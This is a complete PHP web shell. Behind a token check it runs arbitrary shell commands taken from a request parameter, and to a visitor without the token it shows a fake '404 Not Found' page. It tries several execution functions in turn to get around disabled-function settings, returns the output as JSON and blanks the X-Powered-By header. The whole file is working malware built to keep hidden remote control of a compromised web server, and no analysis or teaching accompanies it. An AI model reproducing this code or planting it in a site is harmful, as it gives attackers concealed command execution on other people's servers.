<?php
$t = $_GET['t'] ?? $_SERVER['HTTP_X_EV_TOKEN'] ?? '';
if ($t !== 'EV_TOKEN') {
    http_response_code(404);
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><body><h1>404 Not Found</h1></body></html>';
    exit;
}

$cmd  = $_GET['cmd'] ?? $_POST['cmd'] ?? '';
$out  = '';
$code = -1;

if ($cmd !== '') {
    $disabled = array_map('trim', explode(',', strtolower(ini_get('disable_functions'))));
    $method_used = 'none';

    if (!in_array('proc_open', $disabled) && function_exists('proc_open')) {
        $method_used = 'proc_open';
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            $out  = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $code = proc_close($proc);
        }
    } elseif (!in_array('popen', $disabled) && function_exists('popen')) {
        $method_used = 'popen';
        $h = popen($cmd . ' 2>&1', 'r');
        if ($h) {
            $out = stream_get_contents($h);
            $code = pclose($h);
        }
    } elseif (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
        $method_used = 'shell_exec';
        $out  = shell_exec($cmd . ' 2>&1') ?? '';
        $code = 0;
    } elseif (!in_array('exec', $disabled) && function_exists('exec')) {
        $method_used = 'exec';
        $lines = [];
        exec($cmd . ' 2>&1', $lines, $code);
        $out = implode("\n", $lines);
    } elseif (!in_array('system', $disabled) && function_exists('system')) {
        $method_used = 'system';
        ob_start();
        system($cmd . ' 2>&1', $code);
        $out = ob_get_clean();
    } elseif (!in_array('passthru', $disabled) && function_exists('passthru')) {
        $method_used = 'passthru';
        ob_start();
        passthru($cmd . ' 2>&1', $code);
        $out = ob_get_clean();
    }
}

header('Content-Type: application/json');
header('X-Powered-By: ');
echo json_encode([
    'out'    => $out,
    'code'   => $code,
    'method' => $method_used ?? 'none',
    'disabled_functions' => ini_get('disable_functions'),
]);
